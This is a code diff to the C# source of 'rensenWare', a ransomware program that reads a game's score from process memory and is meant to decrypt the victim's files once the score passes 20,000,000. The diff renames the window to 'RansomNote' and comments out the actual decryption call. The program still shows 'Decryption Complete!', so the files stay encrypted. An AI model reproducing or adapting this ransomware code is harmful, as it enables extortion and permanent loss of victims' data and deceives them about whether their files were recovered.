@@ -12,10 +12,11 @@ using System.IO;
 
 namespace rensenWare
 {
-    public partial class frmWarning : Form
+    // Previous name was frmWarning
+    public partial class RansomNote : Form
     {
         private bool _flag;
-        private bool _flag_billion = false;
+        private bool IsScoreReached = false;
 
         private IntPtr _handle; // Handle for TH12.exe Process
 
@@ -29,6 +30,7 @@ namespace rensenWare
             set
             {
                 _flag = value;
+                
                 if(_flag)
                 {
                     ProcStatus.Invoke(new MethodInvoker(() =>
@@ -98,7 +100,7 @@ namespace rensenWare
                     }
                     else
                     {
-                        if (!_flag_billion)
+                        if (!IsScoreReached)
                         {
                             int bytesRead = 0;
                             byte[] _buffer = new byte[4]; // Will read 4 bytes of memory
@@ -148,7 +150,7 @@ namespace rensenWare
                              * rensenWare reads score from process.
                              * 
                              * Score is stored in
-                             * [base address] + 0xAEBD0, as 4bytes int value.
+                             * [base address] + 0xB0C44, as 4bytes int value.
                              * 
                              */
                             var readScore = ReadProcessMemory((int)_handle, 0x004B0C44, _buffer, 4, ref bytesRead);
@@ -170,7 +172,7 @@ namespace rensenWare
                              * I don't know why it is.
                              */ 
                             if (BitConverter.ToInt32(_buffer, 0) > 20000000) // It is 20,000,000
-                                _flag_billion = true;
+                                IsScoreReached = true;
                             else
                                 _buffer = null;
 
@@ -185,7 +187,7 @@ namespace rensenWare
 
                             decryptProgress.Maximum = Program.encryptedFiles.Count;
 
-                                                 // There's no encrypted Files....
+
                             foreach (var path in Program.encryptedFiles)
                             {
                                 try
@@ -196,7 +198,7 @@ namespace rensenWare
                                     }));
 
                                     // Do Nothing!
-                                    Program.Crypt(path, true);
+                                    // Program.Crypt(path, true);
 
                                     decryptProgress.Value++;
 
@@ -212,6 +214,7 @@ namespace rensenWare
                             this.Invoke(new MethodInvoker(() =>
                             {
                                 MessageBox.Show("Decryption Complete!\nIf there are encrypted files exists, use manual decrypter with key/IV files saved in desktop!");
+                                
                                 ButtonManualDecrypt.Visible = true;
                                 ButtonExit.Visible = true;
                             }));
@@ -237,8 +240,8 @@ namespace rensenWare
 
         private void ButtonManualDecrypt_Click(object sender, EventArgs e)
         {
-            var Decrypter = new frmManualDecrypter();
-            Decrypter.ShowDialog(this);
+            var ManDecrypt = new frmManualDecrypter();
+            ManDecrypt.ShowDialog(this);
         }
     }
 }
